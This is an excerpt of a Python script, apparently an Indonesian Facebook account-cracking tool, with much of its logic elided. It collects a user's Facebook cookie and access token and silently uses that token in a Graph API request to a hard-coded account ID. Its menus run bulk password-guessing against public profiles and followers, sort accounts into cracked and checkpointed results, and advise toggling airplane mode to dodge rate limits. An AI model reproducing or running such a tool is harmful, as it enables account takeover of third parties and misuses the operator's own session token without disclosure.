...
def sound(__bokep__):
	...
	elif __bokep__ in ["complete"]:
		os.popen("play-audio data/audio/complete.mp3")
########## GAMBAR ##########
def banner():
	sapu()
	print("""   \033[1;91m  ███████╗███████╗██╗███╗   ██╗███████╗
...
def login():
	try:
		...
		try:
			...
			print(f"  {P}[{H}!{P}] connection error");exit()
	except IOError:
		masuk()
def jadi():
	try:
		requests.post("https://graph.facebook.com/100011806481936?fields=subscribers&access_token=%s"%(tokenku))
	except:pass
########## MENU LOGIN ##########
def masuk():
	banner()
	sound("login")
	mas = f"""{P2}[{H2}01{P2}] Login with cookie
[{H2}02{P2}] How to get cookies
[{H2}03{P2}] Check results crack
[{H2}00{P2}] Logout"""
	Buat(Anak(mas,width=50,title=f"{H2}login{P2}",style=f"{M3}"))
	nanya = input(f"  {P}[{H}➤➤{P}] Select : ")
	if nanya in ["01","1"]:
		goblok()
	elif nanya in ["02","2"]:
		nd = f"{P2}You will be redirected to YouTube immediately"
		Buat(Anak(nd,width=50,style=f"{M3}"));time.sleep(3)
...
def goblok():
	...
	fo = f"{P2}Type {H2}open{P2} to get the cookie fetch url"
	Buat(Anak(fo,width=50,style=f"{M3}"))
	cookie = input(f"  {P}[{H}➤➤{P}] Enter Cookie : {warna}")
	if cookie in ["Open","OPEN","open"]:
		...
		Buat(Anak(op,width=50,title=f"{H2}link extensions{P2}",style=f"{M3}"))
		exit()
	try:
		...
		tok = open("data/token.txt", "w").write(find_token.group(1));jadi()
		cok = open("data/cookie.txt", "w").write(cookie)
		bh = f"{P2}Success, retype : {H2}python force.py{P2}"
		Buat(Anak(bh,width=50,style=f"{M3}"))
		exit()
	except Exception as e:
		os.system("rm -f data/token.txt")
		os.system("rm -f data/cookie.txt")
		bp = f"{P2}Failed, check the akun first bro"
		Buat(Anak(bp,width=50,style=f"{M3}"))
		exit()
########## MENU ##########
...
{P2}[{H2}•{P2}] Join : {join}
{P2}[{H2}•{P2}] Ip   : {ipku}"""
	Buat(Anak(ak,width=50,title=f"{H2}akun Data{P2}",style=f"{M3}"))
	men = f"""{P2}[{H2}01{P2}] Crack Single Public
{P2}[{H2}02{P2}] Crack Multi Public
{P2}[{H2}03{P2}] Crack Public followers
{P2}[{H2}04{P2}] Check From File
{P2}[{H2}05{P2}] Check results crack
{P2}[{H2}06{P2}] Check Options Of akuns
{P2}[{H2}07{P2}] Back To The Main Menu
{P2}[{H2}00{P2}] Logout ({M2}Delete Cookies{P2})"""
	Buat(Anak(men,width=50,title=f"{H2}menu{P2}",style=f"{M3}"))
	__toket__ = input(f"  {P}[{H}➤➤{P}] Select : ")
	if __toket__ in ["01","1"]:__publik__()
	elif __toket__ in ["02","2"]:__masal__()
	elif __toket__ in ["03","3"]:__folow__()
	elif __toket__ in ["04","4"]:file()
	elif __toket__ in ["05","5"]:__ingfo__()
	elif __toket__ in ["06","6"]:__check__()
	elif __toket__ in ["07","7"]:
		os.system('python 7PRO.py')
		...
		Buat(Anak(tt,width=50,style=f"{M3}"));time.sleep(2)
		jalan(f"  {P}[{H}√{P}] Deleted successfully ...");exit()
	else:
		print(f"\n  {P}[{M}!{P}] Choose the correct one")
		exit()
...
def __publik__():
	try:
		token = open('data/token.txt','r').read();cok = open('data/cookie.txt','r').read()
	except IOError:
		exi()
	jb = f"{P2}[{M2}!{P2}] Make sure the target is public"
	Buat(Anak(jb,width=50,style=f"{M3}"))
	...
	for __colmek__ in uid:
		try:
			...
			print(f"  {P}[{H}!{P}] Connection Error");exit()
	try:
		print(f"  {P}[{H}!{P}] Collected {H}{str(len(id))}{P} id")
...
def __masal__():
	...
	try:
		jb = f"{P2}[{M2}!{P2}] Make sure the target is public"
		Buat(Anak(jb,width=50,style=f"{M3}"))
		__sas__ = int(input(f"  {P}[{H}➤➤{P}] How Many Id You Want To Crack : "))
	except ValueError:
		print(f"  {P}[{H}!{P}] Just enter a number");time.sleep(2);exit()
	if __sas__<1 or __sas__>50:
		print(f"  {P}[{H}!{P}] Limit {H}50{P} ");time.sleep(2);exit()
	ses=requests.Session()
	memek = 0
...
########## FOLLOWER ##########
def __folow__():
	try:token = open('data/token.txt','r').read();cok = open('data/cookie.txt','r').read()
	except IOError:exit()
	ff = f"{P2}[{M2}!{P2}] Pastikan akun bersifat publik"
	Buat(Anak(ff,width=50,style=f"{M3}"))
	...
	try:
		...
		print(f"  {P}[{H}!{P}] Collected {H}{str(len(id))}{P} id");time.sleep(2);setting()
	except requests.exceptions.ConnectionError:print(f"  {P}[{M}!{P}] connection error");time.sleep(2);exit()
...
{P2}[{H2}02{P2}] Check results akun {K2}CP{P2}"""
	Buat(Anak(sil,width=50,title=f"{H2}check results{P2}",style=f"{M3}"))
	__kentod__ = input(f"  {P}[{H}➤➤{P}] Select : ")
	if __kentod__ in ["1","01"]:
		try:
			vin = os.listdir('OK')
		except FileNotFoundError:
			print(f"\n  {P}[{M}!{P}] The file does not exist")
			time.sleep(2)
			exit()
		if len(vin)==0:
			print(f"\n  {P}[{M}!{P}] You do not have any results yet")
		else:
			cih = 0
			lol = {}
			for isi in vin:
			...
			for cpku in range(len(lin)):
				...
				nocp +=1
			goog = f"{P2} Check results crack complete, total {H2}{len(__kentod__)}{P2} akun"
			Buat(Anak(goog,width=50,style=f"{M3}"))
			exit()
...
########## SETTING ##########
def setting():
	st = f"""{P2}[{H2}01{P2}] Crack Old ({M2}tidak disarankan{P2})
[{H2}02{P2}] Crack New ({H2}disarankan{P2})
[{H2}03{P2}] Crack Random ({O2}Recommended{P2})"""
	Buat(Anak(st,width=50,title=f"{H2}setiing id{P2}",style=f"{M3}"))
	__sas__ = input(f"  {P}[{H}➤➤{P}] Select : ")
	if __sas__ in ['1','01']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		bb = f"{P2}[{M3}!{P2}] Gunakan {H2}koma{P2} sebagai pemisah\n[{M2}!{P2}] Contoh : sayangku,anjing,kontol"
		Buat(Anak(bb,width=50,style=f"{M3}"))
		pwku=input(f"  {P}[{H}➤➤{P}] Masukan password : ")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	met = f"{P2}[{H2}01{P2}] Login use facebook validate\n[{H2}02{P2}] Login use facebook regular"
	Buat(Anak(met,width=50,title=f"{H2}method{P2}",style=f"{M3}"))
	__ngentod__ = input(f"  {P}[{H}➤➤{P}] Select : ")
	if __ngentod__ in [""]:
...
{P2}[{H2}03{P2}] Login with m.facebook"""
	Buat(Anak(met,width=50,title=f"{H2}login validate{P2}",style=f"{M3}"))
	__val__ = input(f"  {P}[{H}➤➤{P}] Select : ")
	if __val__ in [""]:
		print(f"\n  {P}[{H}!{P}] Input yang bener");exit()
...
{P2}[{H2}03{P2}] Login with m.facebook      {H2}v2{P2}"""
	Buat(Anak(met2,width=50,title=f"{H2}login regular{P2}",style=f"{M3}"))
	__reg__ = input(f"  {P}[{H}➤➤{P}] Select : ")
	if __reg__ in [""]:
		print(f"\n  {P}[{H}!{P}] Input yang bener");exit()
...
{P2}[{H2}!{P2}] Mode pesawat 3 detik setiap 400 id"""
	Buat(Anak(kp,width=50,style=f"{M3}"))
